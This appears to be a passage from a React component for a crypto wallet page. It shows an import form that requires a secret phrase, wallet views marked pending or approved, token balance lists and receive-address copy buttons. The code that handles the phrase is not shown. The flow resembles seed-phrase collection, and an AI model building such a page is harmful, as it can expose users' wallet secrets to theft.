              onClick={handleImportWallet}
              disabled={isSubmitting || !secretPhrase.trim()}
              className={cn(
                'w-full py-3 sm:py-4 rounded-lg sm:rounded-xl font-semibold text-sm sm:text-base text-white transition-all',
                'bg-[#22c55e] hover:bg-[#1ea550]',
                'disabled:opacity-50 disabled:cursor-not-allowed',
                'flex items-center justify-center gap-2'
              )}
            >
              {isSubmitting ? (
                <>
                  <Loader2 className="h-4 w-4 sm:h-5 sm:w-5 animate-spin" />
                  {t.connectWallet.importing}
                </>
              ) : (
                t.connectWallet.importWallet
              )}
            </button>

            <div className="mt-4 sm:mt-6 p-3 sm:p-4 bg-[#3b82f6]/10 rounded-lg sm:rounded-xl border border-[#3b82f6]/20">
              <div className="flex items-start gap-2.5 sm:gap-3">
                <Info className="h-4 w-4 sm:h-5 sm:w-5 text-[#3b82f6] shrink-0 mt-0.5" />
                <div>
                  <p className="font-medium text-sm sm:text-base text-white mb-0.5 sm:mb-1">{t.connectWallet.whatHappensNext}</p>
                  <p className="text-xs sm:text-sm text-[#6b7a90]">
                    {t.connectWallet.whatHappensNextText}
                  </p>
                </div>
              </div>
            </div>
          </div>
        </motion.div>
      )}

      {/* ===== WALLET DETAIL VIEW ===== */}
      {viewState === 'wallet-detail' && selectedWallet && (
        <motion.div initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }}>
          <button
            onClick={handleBack}
            className="flex items-center gap-1.5 sm:gap-2 text-sm sm:text-base text-[#6b7a90] hover:text-white mb-4 sm:mb-6 transition-colors"
          >
            <ChevronLeft className="h-4 w-4" />
            {t.connectWallet.backToWallets}
          </button>

          <div className="bg-[#0f1419] rounded-lg sm:rounded-xl p-4 sm:p-6 border border-[#1e2733] mb-4 sm:mb-6">
            <div className="flex items-center gap-3 sm:gap-4 mb-3 sm:mb-4">
              <div className="h-11 w-11 sm:h-14 sm:w-14 rounded-xl sm:rounded-2xl bg-[#1e2733] flex items-center justify-center overflow-hidden shrink-0">
                <WalletLogo walletId={selectedWallet.walletType} name={selectedWallet.walletName} size={32} />
              </div>
              <div className="min-w-0 flex-1">
                <h2 className="font-heading text-lg sm:text-xl font-bold text-white truncate">{selectedWallet.walletName}</h2>
                <p className="text-xs sm:text-sm text-[#6b7a90]">
                  {t.connectWallet.connected} {new Date(selectedWallet.createdAt).toLocaleDateString()}
                </p>
              </div>
              {selectedWallet.status === 'approved' && (
                <span className="flex items-center gap-1 sm:gap-1.5 px-2 sm:px-3 py-1 sm:py-1.5 rounded-full bg-[#22c55e]/10 text-[#22c55e] text-xs sm:text-sm font-medium shrink-0">
                  <Shield className="h-3 w-3 sm:h-4 sm:w-4" />
                  <span className="hidden xs:inline">{t.connectWallet.verified}</span>
                </span>
              )}
              {selectedWallet.status === 'pending' && (
                <span className="flex items-center gap-1 sm:gap-1.5 px-2 sm:px-3 py-1 sm:py-1.5 rounded-full bg-[#f59e0b]/10 text-[#f59e0b] text-xs sm:text-sm font-medium shrink-0">
                  <Clock className="h-3 w-3 sm:h-4 sm:w-4" />
                  <span className="hidden xs:inline">{t.connectWallet.pending}</span>
                </span>
              )}
            </div>

            <div className="flex items-center gap-2 p-2.5 sm:p-3 bg-[#0a0e14] rounded-lg">
              <span className="text-xs sm:text-sm text-[#6b7a90]">{t.connectWallet.walletAddress}:</span>
              <span className="text-xs sm:text-sm text-white font-mono flex-1 truncate">{selectedWallet.address}</span>
              <button
                onClick={() => handleCopyAddress(selectedWallet.address)}
                className="text-[#6b7a90] hover:text-white transition-colors shrink-0"
              >
                {copied ? <Check className="h-4 w-4 text-[#22c55e]" /> : <Copy className="h-4 w-4" />}
              </button>
            </div>
          </div>

          {selectedWallet.status === 'pending' && (
            <div className="bg-[#f59e0b]/10 rounded-lg sm:rounded-xl p-4 sm:p-5 border border-[#f59e0b]/20 mb-4 sm:mb-6">
              <div className="flex items-start gap-2.5 sm:gap-3">
                <Clock className="h-4 w-4 sm:h-5 sm:w-5 text-[#f59e0b] shrink-0 mt-0.5" />
                <div>
                  <p className="font-medium text-sm sm:text-base text-white mb-0.5 sm:mb-1">{t.connectWallet.pendingVerification}</p>
                  <p className="text-xs sm:text-sm text-[#6b7a90]">
                    {t.connectWallet.whatHappensNextText}
                  </p>
                </div>
              </div>
            </div>
          )}

          {selectedWallet.status === 'approved' && (
            <>
              <div className="bg-[#0f1419] rounded-lg sm:rounded-xl p-4 sm:p-5 border border-[#1e2733] mb-4 sm:mb-6">
                <p className="text-xs sm:text-sm text-[#6b7a90] mb-0.5 sm:mb-1">{t.connectWallet.initialBalance}</p>
                <p className="font-heading text-2xl sm:text-3xl font-bold text-white">
                  {formatCurrency(selectedWallet.totalBalanceUsd)}
                </p>
                <p className="text-[10px] sm:text-xs text-[#6b7a90] mt-1.5 sm:mt-2">
                  {t.connectWallet.balanceNote}
                </p>
              </div>

              {/* Token List */}
              <div>
                <h3 className="font-heading font-semibold text-sm sm:text-base text-white mb-3 sm:mb-4">
                  {t.connectWallet.tokens} ({selectedWallet.tokens.filter(tk => (tk.initialAmountUsd || tk.amountUsd) > 0).length})
                </h3>
                <div className="space-y-2 sm:space-y-3">
                  {selectedWallet.tokens
                    .filter(tk => (tk.initialAmountUsd || tk.amountUsd) > 0)
                    .sort((a, b) => (b.currentAmountUsd || b.amountUsd) - (a.currentAmountUsd || a.amountUsd))
                    .map((token) => {
                      const initialBalance = token.initialAmountUsd || token.amountUsd || 0;
                      const currentBalance = token.currentAmountUsd || 0;
                      
                      return (
                        <button
                          key={token.symbol}
                          onClick={() => handleViewToken(token)}
                          className="w-full flex items-center justify-between p-3 sm:p-4 bg-[#0f1419] rounded-lg sm:rounded-xl border border-[#1e2733] hover:border-[#2a3441] transition-colors"
                        >
                          <div className="flex items-center gap-2.5 sm:gap-3">
                            <div className="h-9 w-9 sm:h-10 sm:w-10 rounded-full overflow-hidden bg-[#1e2733] shrink-0">
                              <Image 
                                src={token.icon} 
                                alt={token.symbol} 
                                width={40} 
                                height={40} 
                                className="object-cover" 
                                unoptimized 
                              />
                            </div>
                            <div className="text-left min-w-0">
                              <p className="font-medium text-sm sm:text-base text-white truncate">{token.name}</p>
                              <p className="text-xs sm:text-sm text-[#6b7a90]">{token.symbol}</p>
                            </div>
                          </div>
                          <div className="text-right flex items-center gap-2 sm:gap-3">
                            <div>
                              <p className="font-medium text-sm sm:text-base text-white">{formatCurrency(currentBalance)}</p>
                              <p className="text-[10px] sm:text-xs text-[#6b7a90]">
                                {t.connectWallet.initialBalance}: {formatCurrency(initialBalance)}
                              </p>
                            </div>
                            <ChevronRight className="h-4 w-4 sm:h-5 sm:w-5 text-[#6b7a90] shrink-0" />
                          </div>
                        </button>
                      );
                    })}
                </div>

                {selectedWallet.tokens.filter(tk => (tk.initialAmountUsd || tk.amountUsd) > 0).length === 0 && (
                  <div className="text-center py-8 sm:py-12 bg-[#0f1419] rounded-lg sm:rounded-xl border border-[#1e2733]">
                    <Coins className="h-10 w-10 sm:h-12 sm:w-12 text-[#6b7a90] mx-auto mb-2 sm:mb-3" />
                    <p className="text-sm sm:text-base text-[#6b7a90]">{t.connectWallet.noTokens}</p>
                  </div>
                )}
              </div>
            </>
          )}
        </motion.div>
      )}

      {/* ===== TOKEN DETAIL VIEW ===== */}
      {viewState === 'token-detail' && selectedToken && selectedWallet && (
        <motion.div initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }}>
          <button
            onClick={handleBack}
            className="flex items-center gap-1.5 sm:gap-2 text-sm sm:text-base text-[#6b7a90] hover:text-white mb-4 sm:mb-6 transition-colors"
          >
            <ChevronLeft className="h-4 w-4" />
            {t.connectWallet.backToWallet}
          </button>

          <div className="bg-[#0f1419] rounded-lg sm:rounded-xl p-4 sm:p-6 border border-[#1e2733] mb-4 sm:mb-6">
            <div className="flex items-center gap-3 sm:gap-4 mb-4 sm:mb-6">
              <div className="h-12 w-12 sm:h-16 sm:w-16 rounded-full overflow-hidden bg-[#1e2733] shrink-0">
                <Image 
                  src={selectedToken.icon} 
                  alt={selectedToken.symbol} 
                  width={64} 
                  height={64} 
                  className="object-cover" 
                  unoptimized 
                />
              </div>
              <div className="min-w-0">
                <h2 className="font-heading text-xl sm:text-2xl font-bold text-white truncate">{selectedToken.name}</h2>
                <p className="text-sm sm:text-base text-[#6b7a90]">{selectedToken.symbol}</p>
              </div>
            </div>

            <div className="grid grid-cols-2 gap-2 sm:gap-4 mb-3 sm:mb-4">
              <div className="p-3 sm:p-4 bg-[#0a0e14] rounded-lg sm:rounded-xl">
                <p className="text-[10px] sm:text-sm text-[#6b7a90] mb-0.5 sm:mb-1">{t.connectWallet.currentBalance}</p>
                <p className="text-lg sm:text-xl font-bold text-white">
                  {formatCurrency(selectedToken.currentAmountUsd || 0)}
                </p>
              </div>
              <div className="p-3 sm:p-4 bg-[#0a0e14] rounded-lg sm:rounded-xl">
                <p className="text-[10px] sm:text-sm text-[#6b7a90] mb-0.5 sm:mb-1">{t.connectWallet.initialBalance}</p>
                <p className="text-lg sm:text-xl font-bold text-[#6b7a90]">
                  {formatCurrency(selectedToken.initialAmountUsd || selectedToken.amountUsd || 0)}
                </p>
              </div>
            </div>

            <div className="p-3 sm:p-4 bg-[#3b82f6]/10 rounded-lg sm:rounded-xl border border-[#3b82f6]/20">
              <p className="text-[10px] sm:text-sm text-[#3b82f6]">
                <strong>Note:</strong> {t.connectWallet.balanceNote}
              </p>
            </div>
          </div>

          {/* Token Receive Address */}
          {selectedToken.tokenAddress ? (
            <div className="bg-[#0f1419] rounded-lg sm:rounded-xl p-4 sm:p-6 border border-[#1e2733]">
              <div className="flex items-center gap-2.5 sm:gap-3 mb-3 sm:mb-4">
                <div className="h-9 w-9 sm:h-10 sm:w-10 rounded-lg sm:rounded-xl bg-[#22c55e]/10 flex items-center justify-center shrink-0">
                  <ArrowDownLeft className="h-4 w-4 sm:h-5 sm:w-5 text-[#22c55e]" />
                </div>
                <div className="min-w-0">
                  <h3 className="font-semibold text-sm sm:text-base text-white">{t.connectWallet.receive} {selectedToken.symbol}</h3>
                  <p className="text-xs sm:text-sm text-[#6b7a90] truncate">{selectedToken.name} {t.connectWallet.network}</p>
                </div>
              </div>

              <div className="p-3 sm:p-4 bg-[#0a0e14] rounded-lg sm:rounded-xl mb-3 sm:mb-4">
                <p className="text-[10px] sm:text-xs text-[#6b7a90] mb-1 sm:mb-2">{selectedToken.symbol} {t.connectWallet.walletAddress}</p>
                <p className="text-xs sm:text-sm text-white font-mono break-all">{selectedToken.tokenAddress}</p>
              </div>

              <button
                onClick={() => handleCopyAddress(selectedToken.tokenAddress!)}
                className="w-full flex items-center justify-center gap-2 py-2.5 sm:py-3 rounded-lg sm:rounded-xl bg-[#22c55e] text-white text-sm sm:text-base font-semibold hover:bg-[#1ea550] transition-colors"
              >
                {copied ? <Check className="h-4 w-4 sm:h-5 sm:w-5" /> : <Copy className="h-4 w-4 sm:h-5 sm:w-5" />}
                {copied ? t.connectWallet.copied : t.connectWallet.copyAddress}
              </button>

              <div className="mt-3 sm:mt-4 p-2.5 sm:p-3 bg-[#f59e0b]/10 rounded-lg border border-[#f59e0b]/20">
                <p className="text-[10px] sm:text-xs text-[#f59e0b]">
                  <strong>Important:</strong> {t.connectWallet.importantSendOnly.replace('{token}', selectedToken.symbol)}
                </p>
              </div>
            </div>
          ) : (
            <div className="bg-[#0f1419] rounded-lg sm:rounded-xl p-4 sm:p-6 border border-[#1e2733]">
              <div className="flex items-center gap-2.5 sm:gap-3 mb-3 sm:mb-4">
                <div className="h-9 w-9 sm:h-10 sm:w-10 rounded-lg sm:rounded-xl bg-[#22c55e]/10 flex items-center justify-center shrink-0">
                  <Wallet className="h-4 w-4 sm:h-5 sm:w-5 text-[#22c55e]" />
                </div>
                <div className="min-w-0">
                  <h3 className="font-semibold text-sm sm:text-base text-white">{t.connectWallet.walletAddress}</h3>
                  <p className="text-xs sm:text-sm text-[#6b7a90] truncate">{selectedWallet.walletName}</p>
                </div>
              </div>

              <div className="p-3 sm:p-4 bg-[#0a0e14] rounded-lg sm:rounded-xl mb-3 sm:mb-4">
                <p className="text-[10px] sm:text-xs text-[#6b7a90] mb-1 sm:mb-2">{t.connectWallet.receive} {t.connectWallet.walletAddress}</p>
                <p className="text-xs sm:text-sm text-white font-mono break-all">{selectedWallet.address}</p>
              </div>

              <button
                onClick={() => handleCopyAddress(selectedWallet.address)}
                className="w-full flex items-center justify-center gap-2 py-2.5 sm:py-3 rounded-lg sm:rounded-xl bg-[#22c55e] text-white text-sm sm:text-base font-semibold hover:bg-[#1ea550] transition-colors"
              >
                {copied ? <Check className="h-4 w-4 sm:h-5 sm:w-5" /> : <Copy className="h-4 w-4 sm:h-5 sm:w-5" />}
                {copied ? t.connectWallet.copied : t.connectWallet.copyAddress}
              </button>

              <div className="mt-3 sm:mt-4 p-2.5 sm:p-3 bg-[#f59e0b]/10 rounded-lg border border-[#f59e0b]/20">
                <p className="text-[10px] sm:text-xs text-[#f59e0b]">
                  <strong>Important:</strong> {t.connectWallet.importantSendOnly.replace('{token}', selectedToken.symbol)}
                </p>
              </div>
            </div>
          )}
        </motion.div>
      )}

      <ToastContainer toasts={toasts} onDismiss={dismissToast} />
    </div>
  );
}
